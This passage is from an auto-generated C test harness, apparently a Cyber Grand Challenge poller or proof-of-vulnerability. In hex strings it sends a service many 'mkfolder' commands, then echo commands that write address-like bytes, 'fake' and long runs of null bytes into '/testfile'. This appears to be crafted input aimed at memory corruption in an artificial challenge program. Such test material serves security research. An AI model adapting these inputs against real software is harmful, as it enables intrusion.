         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x31\x30\x0a";
      static unsigned int write_00112_00000_len = 23;
      unsigned char *write_00112 = NULL;
      unsigned int write_00112_len = 0;
      write_00112 = cgc_append_buf(write_00112, &write_00112_len, write_00112_00000, write_00112_00000_len);
      if (write_00112_len > 0) {
         cgc_transmit_all(1, write_00112, write_00112_len);
      }
      cgc_free(write_00112);
   } while (0);
   do {
      unsigned char *read_00114;
      unsigned int read_00114_len;
      unsigned int read_00114_ptr = 0;
      //**** delimited read
      static unsigned char read_00114_delim[] = 
         "\x25\x20";
      read_00114 = NULL;
      read_00114_len = 0;
      int read_00114_res = cgc_delimited_read(0, &read_00114, &read_00114_len, read_00114_delim, 2);
      if (read_00114_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00114_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00114_ptr += cgc_data_match(read_00114 + read_00114_ptr, read_00114_len - read_00114_ptr, match_00114_00000, 18);
      cgc_free(read_00114);
      if (read_00114_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00113_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x31\x31\x0a";
      static unsigned int write_00113_00000_len = 23;
      unsigned char *write_00113 = NULL;
      unsigned int write_00113_len = 0;
      write_00113 = cgc_append_buf(write_00113, &write_00113_len, write_00113_00000, write_00113_00000_len);
      if (write_00113_len > 0) {
         cgc_transmit_all(1, write_00113, write_00113_len);
      }
      cgc_free(write_00113);
   } while (0);
   do {
      unsigned char *read_00115;
      unsigned int read_00115_len;
      unsigned int read_00115_ptr = 0;
      //**** delimited read
      static unsigned char read_00115_delim[] = 
         "\x25\x20";
      read_00115 = NULL;
      read_00115_len = 0;
      int read_00115_res = cgc_delimited_read(0, &read_00115, &read_00115_len, read_00115_delim, 2);
      if (read_00115_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00115_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00115_ptr += cgc_data_match(read_00115 + read_00115_ptr, read_00115_len - read_00115_ptr, match_00115_00000, 18);
      cgc_free(read_00115);
      if (read_00115_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00114_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x31\x32\x0a";
      static unsigned int write_00114_00000_len = 23;
      unsigned char *write_00114 = NULL;
      unsigned int write_00114_len = 0;
      write_00114 = cgc_append_buf(write_00114, &write_00114_len, write_00114_00000, write_00114_00000_len);
      if (write_00114_len > 0) {
         cgc_transmit_all(1, write_00114, write_00114_len);
      }
      cgc_free(write_00114);
   } while (0);
   do {
      unsigned char *read_00116;
      unsigned int read_00116_len;
      unsigned int read_00116_ptr = 0;
      //**** delimited read
      static unsigned char read_00116_delim[] = 
         "\x25\x20";
      read_00116 = NULL;
      read_00116_len = 0;
      int read_00116_res = cgc_delimited_read(0, &read_00116, &read_00116_len, read_00116_delim, 2);
      if (read_00116_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00116_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00116_ptr += cgc_data_match(read_00116 + read_00116_ptr, read_00116_len - read_00116_ptr, match_00116_00000, 18);
      cgc_free(read_00116);
      if (read_00116_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00115_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x31\x33\x0a";
      static unsigned int write_00115_00000_len = 23;
      unsigned char *write_00115 = NULL;
      unsigned int write_00115_len = 0;
      write_00115 = cgc_append_buf(write_00115, &write_00115_len, write_00115_00000, write_00115_00000_len);
      if (write_00115_len > 0) {
         cgc_transmit_all(1, write_00115, write_00115_len);
      }
      cgc_free(write_00115);
   } while (0);
   do {
      unsigned char *read_00117;
      unsigned int read_00117_len;
      unsigned int read_00117_ptr = 0;
      //**** delimited read
      static unsigned char read_00117_delim[] = 
         "\x25\x20";
      read_00117 = NULL;
      read_00117_len = 0;
      int read_00117_res = cgc_delimited_read(0, &read_00117, &read_00117_len, read_00117_delim, 2);
      if (read_00117_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00117_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00117_ptr += cgc_data_match(read_00117 + read_00117_ptr, read_00117_len - read_00117_ptr, match_00117_00000, 18);
      cgc_free(read_00117);
      if (read_00117_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00116_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x31\x34\x0a";
      static unsigned int write_00116_00000_len = 23;
      unsigned char *write_00116 = NULL;
      unsigned int write_00116_len = 0;
      write_00116 = cgc_append_buf(write_00116, &write_00116_len, write_00116_00000, write_00116_00000_len);
      if (write_00116_len > 0) {
         cgc_transmit_all(1, write_00116, write_00116_len);
      }
      cgc_free(write_00116);
   } while (0);
   do {
      unsigned char *read_00118;
      unsigned int read_00118_len;
      unsigned int read_00118_ptr = 0;
      //**** delimited read
      static unsigned char read_00118_delim[] = 
         "\x25\x20";
      read_00118 = NULL;
      read_00118_len = 0;
      int read_00118_res = cgc_delimited_read(0, &read_00118, &read_00118_len, read_00118_delim, 2);
      if (read_00118_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00118_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00118_ptr += cgc_data_match(read_00118 + read_00118_ptr, read_00118_len - read_00118_ptr, match_00118_00000, 18);
      cgc_free(read_00118);
      if (read_00118_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00117_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x31\x35\x0a";
      static unsigned int write_00117_00000_len = 23;
      unsigned char *write_00117 = NULL;
      unsigned int write_00117_len = 0;
      write_00117 = cgc_append_buf(write_00117, &write_00117_len, write_00117_00000, write_00117_00000_len);
      if (write_00117_len > 0) {
         cgc_transmit_all(1, write_00117, write_00117_len);
      }
      cgc_free(write_00117);
   } while (0);
   do {
      unsigned char *read_00119;
      unsigned int read_00119_len;
      unsigned int read_00119_ptr = 0;
      //**** delimited read
      static unsigned char read_00119_delim[] = 
         "\x25\x20";
      read_00119 = NULL;
      read_00119_len = 0;
      int read_00119_res = cgc_delimited_read(0, &read_00119, &read_00119_len, read_00119_delim, 2);
      if (read_00119_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00119_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00119_ptr += cgc_data_match(read_00119 + read_00119_ptr, read_00119_len - read_00119_ptr, match_00119_00000, 18);
      cgc_free(read_00119);
      if (read_00119_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00118_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x31\x36\x0a";
      static unsigned int write_00118_00000_len = 23;
      unsigned char *write_00118 = NULL;
      unsigned int write_00118_len = 0;
      write_00118 = cgc_append_buf(write_00118, &write_00118_len, write_00118_00000, write_00118_00000_len);
      if (write_00118_len > 0) {
         cgc_transmit_all(1, write_00118, write_00118_len);
      }
      cgc_free(write_00118);
   } while (0);
   do {
      unsigned char *read_00120;
      unsigned int read_00120_len;
      unsigned int read_00120_ptr = 0;
      //**** delimited read
      static unsigned char read_00120_delim[] = 
         "\x25\x20";
      read_00120 = NULL;
      read_00120_len = 0;
      int read_00120_res = cgc_delimited_read(0, &read_00120, &read_00120_len, read_00120_delim, 2);
      if (read_00120_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00120_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00120_ptr += cgc_data_match(read_00120 + read_00120_ptr, read_00120_len - read_00120_ptr, match_00120_00000, 18);
      cgc_free(read_00120);
      if (read_00120_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00119_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x31\x37\x0a";
      static unsigned int write_00119_00000_len = 23;
      unsigned char *write_00119 = NULL;
      unsigned int write_00119_len = 0;
      write_00119 = cgc_append_buf(write_00119, &write_00119_len, write_00119_00000, write_00119_00000_len);
      if (write_00119_len > 0) {
         cgc_transmit_all(1, write_00119, write_00119_len);
      }
      cgc_free(write_00119);
   } while (0);
   do {
      unsigned char *read_00121;
      unsigned int read_00121_len;
      unsigned int read_00121_ptr = 0;
      //**** delimited read
      static unsigned char read_00121_delim[] = 
         "\x25\x20";
      read_00121 = NULL;
      read_00121_len = 0;
      int read_00121_res = cgc_delimited_read(0, &read_00121, &read_00121_len, read_00121_delim, 2);
      if (read_00121_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00121_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00121_ptr += cgc_data_match(read_00121 + read_00121_ptr, read_00121_len - read_00121_ptr, match_00121_00000, 18);
      cgc_free(read_00121);
      if (read_00121_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00120_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x31\x38\x0a";
      static unsigned int write_00120_00000_len = 23;
      unsigned char *write_00120 = NULL;
      unsigned int write_00120_len = 0;
      write_00120 = cgc_append_buf(write_00120, &write_00120_len, write_00120_00000, write_00120_00000_len);
      if (write_00120_len > 0) {
         cgc_transmit_all(1, write_00120, write_00120_len);
      }
      cgc_free(write_00120);
   } while (0);
   do {
      unsigned char *read_00122;
      unsigned int read_00122_len;
      unsigned int read_00122_ptr = 0;
      //**** delimited read
      static unsigned char read_00122_delim[] = 
         "\x25\x20";
      read_00122 = NULL;
      read_00122_len = 0;
      int read_00122_res = cgc_delimited_read(0, &read_00122, &read_00122_len, read_00122_delim, 2);
      if (read_00122_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00122_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00122_ptr += cgc_data_match(read_00122 + read_00122_ptr, read_00122_len - read_00122_ptr, match_00122_00000, 18);
      cgc_free(read_00122);
      if (read_00122_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00121_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x31\x39\x0a";
      static unsigned int write_00121_00000_len = 23;
      unsigned char *write_00121 = NULL;
      unsigned int write_00121_len = 0;
      write_00121 = cgc_append_buf(write_00121, &write_00121_len, write_00121_00000, write_00121_00000_len);
      if (write_00121_len > 0) {
         cgc_transmit_all(1, write_00121, write_00121_len);
      }
      cgc_free(write_00121);
   } while (0);
   do {
      unsigned char *read_00123;
      unsigned int read_00123_len;
      unsigned int read_00123_ptr = 0;
      //**** delimited read
      static unsigned char read_00123_delim[] = 
         "\x25\x20";
      read_00123 = NULL;
      read_00123_len = 0;
      int read_00123_res = cgc_delimited_read(0, &read_00123, &read_00123_len, read_00123_delim, 2);
      if (read_00123_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00123_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00123_ptr += cgc_data_match(read_00123 + read_00123_ptr, read_00123_len - read_00123_ptr, match_00123_00000, 18);
      cgc_free(read_00123);
      if (read_00123_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00122_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x32\x30\x0a";
      static unsigned int write_00122_00000_len = 23;
      unsigned char *write_00122 = NULL;
      unsigned int write_00122_len = 0;
      write_00122 = cgc_append_buf(write_00122, &write_00122_len, write_00122_00000, write_00122_00000_len);
      if (write_00122_len > 0) {
         cgc_transmit_all(1, write_00122, write_00122_len);
      }
      cgc_free(write_00122);
   } while (0);
   do {
      unsigned char *read_00124;
      unsigned int read_00124_len;
      unsigned int read_00124_ptr = 0;
      //**** delimited read
      static unsigned char read_00124_delim[] = 
         "\x25\x20";
      read_00124 = NULL;
      read_00124_len = 0;
      int read_00124_res = cgc_delimited_read(0, &read_00124, &read_00124_len, read_00124_delim, 2);
      if (read_00124_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00124_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00124_ptr += cgc_data_match(read_00124 + read_00124_ptr, read_00124_len - read_00124_ptr, match_00124_00000, 18);
      cgc_free(read_00124);
      if (read_00124_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00123_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x32\x31\x0a";
      static unsigned int write_00123_00000_len = 23;
      unsigned char *write_00123 = NULL;
      unsigned int write_00123_len = 0;
      write_00123 = cgc_append_buf(write_00123, &write_00123_len, write_00123_00000, write_00123_00000_len);
      if (write_00123_len > 0) {
         cgc_transmit_all(1, write_00123, write_00123_len);
      }
      cgc_free(write_00123);
   } while (0);
   do {
      unsigned char *read_00125;
      unsigned int read_00125_len;
      unsigned int read_00125_ptr = 0;
      //**** delimited read
      static unsigned char read_00125_delim[] = 
         "\x25\x20";
      read_00125 = NULL;
      read_00125_len = 0;
      int read_00125_res = cgc_delimited_read(0, &read_00125, &read_00125_len, read_00125_delim, 2);
      if (read_00125_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00125_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00125_ptr += cgc_data_match(read_00125 + read_00125_ptr, read_00125_len - read_00125_ptr, match_00125_00000, 18);
      cgc_free(read_00125);
      if (read_00125_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00124_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x32\x32\x0a";
      static unsigned int write_00124_00000_len = 23;
      unsigned char *write_00124 = NULL;
      unsigned int write_00124_len = 0;
      write_00124 = cgc_append_buf(write_00124, &write_00124_len, write_00124_00000, write_00124_00000_len);
      if (write_00124_len > 0) {
         cgc_transmit_all(1, write_00124, write_00124_len);
      }
      cgc_free(write_00124);
   } while (0);
   do {
      unsigned char *read_00126;
      unsigned int read_00126_len;
      unsigned int read_00126_ptr = 0;
      //**** delimited read
      static unsigned char read_00126_delim[] = 
         "\x25\x20";
      read_00126 = NULL;
      read_00126_len = 0;
      int read_00126_res = cgc_delimited_read(0, &read_00126, &read_00126_len, read_00126_delim, 2);
      if (read_00126_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00126_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00126_ptr += cgc_data_match(read_00126 + read_00126_ptr, read_00126_len - read_00126_ptr, match_00126_00000, 18);
      cgc_free(read_00126);
      if (read_00126_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00125_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x32\x33\x0a";
      static unsigned int write_00125_00000_len = 23;
      unsigned char *write_00125 = NULL;
      unsigned int write_00125_len = 0;
      write_00125 = cgc_append_buf(write_00125, &write_00125_len, write_00125_00000, write_00125_00000_len);
      if (write_00125_len > 0) {
         cgc_transmit_all(1, write_00125, write_00125_len);
      }
      cgc_free(write_00125);
   } while (0);
   do {
      unsigned char *read_00127;
      unsigned int read_00127_len;
      unsigned int read_00127_ptr = 0;
      //**** delimited read
      static unsigned char read_00127_delim[] = 
         "\x25\x20";
      read_00127 = NULL;
      read_00127_len = 0;
      int read_00127_res = cgc_delimited_read(0, &read_00127, &read_00127_len, read_00127_delim, 2);
      if (read_00127_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00127_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00127_ptr += cgc_data_match(read_00127 + read_00127_ptr, read_00127_len - read_00127_ptr, match_00127_00000, 18);
      cgc_free(read_00127);
      if (read_00127_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00126_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x32\x34\x0a";
      static unsigned int write_00126_00000_len = 23;
      unsigned char *write_00126 = NULL;
      unsigned int write_00126_len = 0;
      write_00126 = cgc_append_buf(write_00126, &write_00126_len, write_00126_00000, write_00126_00000_len);
      if (write_00126_len > 0) {
         cgc_transmit_all(1, write_00126, write_00126_len);
      }
      cgc_free(write_00126);
   } while (0);
   do {
      unsigned char *read_00128;
      unsigned int read_00128_len;
      unsigned int read_00128_ptr = 0;
      //**** delimited read
      static unsigned char read_00128_delim[] = 
         "\x25\x20";
      read_00128 = NULL;
      read_00128_len = 0;
      int read_00128_res = cgc_delimited_read(0, &read_00128, &read_00128_len, read_00128_delim, 2);
      if (read_00128_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00128_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00128_ptr += cgc_data_match(read_00128 + read_00128_ptr, read_00128_len - read_00128_ptr, match_00128_00000, 18);
      cgc_free(read_00128);
      if (read_00128_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00127_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x32\x35\x0a";
      static unsigned int write_00127_00000_len = 23;
      unsigned char *write_00127 = NULL;
      unsigned int write_00127_len = 0;
      write_00127 = cgc_append_buf(write_00127, &write_00127_len, write_00127_00000, write_00127_00000_len);
      if (write_00127_len > 0) {
         cgc_transmit_all(1, write_00127, write_00127_len);
      }
      cgc_free(write_00127);
   } while (0);
   do {
      unsigned char *read_00129;
      unsigned int read_00129_len;
      unsigned int read_00129_ptr = 0;
      //**** delimited read
      static unsigned char read_00129_delim[] = 
         "\x25\x20";
      read_00129 = NULL;
      read_00129_len = 0;
      int read_00129_res = cgc_delimited_read(0, &read_00129, &read_00129_len, read_00129_delim, 2);
      if (read_00129_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00129_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00129_ptr += cgc_data_match(read_00129 + read_00129_ptr, read_00129_len - read_00129_ptr, match_00129_00000, 18);
      cgc_free(read_00129);
      if (read_00129_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00128_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x32\x36\x0a";
      static unsigned int write_00128_00000_len = 23;
      unsigned char *write_00128 = NULL;
      unsigned int write_00128_len = 0;
      write_00128 = cgc_append_buf(write_00128, &write_00128_len, write_00128_00000, write_00128_00000_len);
      if (write_00128_len > 0) {
         cgc_transmit_all(1, write_00128, write_00128_len);
      }
      cgc_free(write_00128);
   } while (0);
   do {
      unsigned char *read_00130;
      unsigned int read_00130_len;
      unsigned int read_00130_ptr = 0;
      //**** delimited read
      static unsigned char read_00130_delim[] = 
         "\x25\x20";
      read_00130 = NULL;
      read_00130_len = 0;
      int read_00130_res = cgc_delimited_read(0, &read_00130, &read_00130_len, read_00130_delim, 2);
      if (read_00130_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00130_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00130_ptr += cgc_data_match(read_00130 + read_00130_ptr, read_00130_len - read_00130_ptr, match_00130_00000, 18);
      cgc_free(read_00130);
      if (read_00130_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00129_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x32\x37\x0a";
      static unsigned int write_00129_00000_len = 23;
      unsigned char *write_00129 = NULL;
      unsigned int write_00129_len = 0;
      write_00129 = cgc_append_buf(write_00129, &write_00129_len, write_00129_00000, write_00129_00000_len);
      if (write_00129_len > 0) {
         cgc_transmit_all(1, write_00129, write_00129_len);
      }
      cgc_free(write_00129);
   } while (0);
   do {
      unsigned char *read_00131;
      unsigned int read_00131_len;
      unsigned int read_00131_ptr = 0;
      //**** delimited read
      static unsigned char read_00131_delim[] = 
         "\x25\x20";
      read_00131 = NULL;
      read_00131_len = 0;
      int read_00131_res = cgc_delimited_read(0, &read_00131, &read_00131_len, read_00131_delim, 2);
      if (read_00131_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00131_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00131_ptr += cgc_data_match(read_00131 + read_00131_ptr, read_00131_len - read_00131_ptr, match_00131_00000, 18);
      cgc_free(read_00131);
      if (read_00131_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00130_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x32\x38\x0a";
      static unsigned int write_00130_00000_len = 23;
      unsigned char *write_00130 = NULL;
      unsigned int write_00130_len = 0;
      write_00130 = cgc_append_buf(write_00130, &write_00130_len, write_00130_00000, write_00130_00000_len);
      if (write_00130_len > 0) {
         cgc_transmit_all(1, write_00130, write_00130_len);
      }
      cgc_free(write_00130);
   } while (0);
   do {
      unsigned char *read_00132;
      unsigned int read_00132_len;
      unsigned int read_00132_ptr = 0;
      //**** delimited read
      static unsigned char read_00132_delim[] = 
         "\x25\x20";
      read_00132 = NULL;
      read_00132_len = 0;
      int read_00132_res = cgc_delimited_read(0, &read_00132, &read_00132_len, read_00132_delim, 2);
      if (read_00132_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00132_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00132_ptr += cgc_data_match(read_00132 + read_00132_ptr, read_00132_len - read_00132_ptr, match_00132_00000, 18);
      cgc_free(read_00132);
      if (read_00132_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00131_00000[] = 
         "\x65\x63\x68\x6f\x20\x22\x5c\x78\x30\x34\x5c\x78\x65\x65\x5c\x78"
         "\x66\x66\x5c\x78\x62\x37\x22\x20\x3e\x20\x2f\x74\x65\x73\x74\x66"
         "\x69\x6c\x65\x0a";
      static unsigned int write_00131_00000_len = 36;
      unsigned char *write_00131 = NULL;
      unsigned int write_00131_len = 0;
      write_00131 = cgc_append_buf(write_00131, &write_00131_len, write_00131_00000, write_00131_00000_len);
      if (write_00131_len > 0) {
         cgc_transmit_all(1, write_00131, write_00131_len);
      }
      cgc_free(write_00131);
   } while (0);
   do {
      unsigned char *read_00133;
      unsigned int read_00133_len;
      unsigned int read_00133_ptr = 0;
      //**** delimited read
      static unsigned char read_00133_delim[] = 
         "\x25\x20";
      read_00133 = NULL;
      read_00133_len = 0;
      int read_00133_res = cgc_delimited_read(0, &read_00133, &read_00133_len, read_00133_delim, 2);
      if (read_00133_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00133_00000[] = 
         "\x25\x20";
      read_00133_ptr += cgc_data_match(read_00133 + read_00133_ptr, read_00133_len - read_00133_ptr, match_00133_00000, 2);
      cgc_free(read_00133);
      if (read_00133_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00132_00000[] = 
         "\x65\x63\x68\x6f\x20\x22\x66\x61\x6b\x65\x22\x20\x3e\x3e\x20\x2f"
         "\x74\x65\x73\x74\x66\x69\x6c\x65\x0a";
      static unsigned int write_00132_00000_len = 25;
      unsigned char *write_00132 = NULL;
      unsigned int write_00132_len = 0;
      write_00132 = cgc_append_buf(write_00132, &write_00132_len, write_00132_00000, write_00132_00000_len);
      if (write_00132_len > 0) {
         cgc_transmit_all(1, write_00132, write_00132_len);
      }
      cgc_free(write_00132);
   } while (0);
   do {
      unsigned char *read_00134;
      unsigned int read_00134_len;
      unsigned int read_00134_ptr = 0;
      //**** delimited read
      static unsigned char read_00134_delim[] = 
         "\x25\x20";
      read_00134 = NULL;
      read_00134_len = 0;
      int read_00134_res = cgc_delimited_read(0, &read_00134, &read_00134_len, read_00134_delim, 2);
      if (read_00134_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00134_00000[] = 
         "\x25\x20";
      read_00134_ptr += cgc_data_match(read_00134 + read_00134_ptr, read_00134_len - read_00134_ptr, match_00134_00000, 2);
      cgc_free(read_00134);
      if (read_00134_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00133_00000[] = 
         "\x65\x63\x68\x6f\x20\x22\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x22\x20"
         "\x3e\x3e\x20\x2f\x74\x65\x73\x74\x66\x69\x6c\x65\x0a";
      static unsigned int write_00133_00000_len = 141;
      unsigned char *write_00133 = NULL;
      unsigned int write_00133_len = 0;
      write_00133 = cgc_append_buf(write_00133, &write_00133_len, write_00133_00000, write_00133_00000_len);
      if (write_00133_len > 0) {
         cgc_transmit_all(1, write_00133, write_00133_len);
      }
      cgc_free(write_00133);
   } while (0);
   do {
      unsigned char *read_00135;
      unsigned int read_00135_len;
      unsigned int read_00135_ptr = 0;
      //**** delimited read
      static unsigned char read_00135_delim[] = 
         "\x25\x20";
      read_00135 = NULL;
      read_00135_len = 0;
      int read_00135_res = cgc_delimited_read(0, &read_00135, &read_00135_len, read_00135_delim, 2);
      if (read_00135_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00135_00000[] = 
         "\x25\x20";
      read_00135_ptr += cgc_data_match(read_00135 + read_00135_ptr, read_00135_len - read_00135_ptr, match_00135_00000, 2);
      cgc_free(read_00135);
      if (read_00135_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00134_00000[] = 
         "\x65\x63\x68\x6f\x20\x22\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
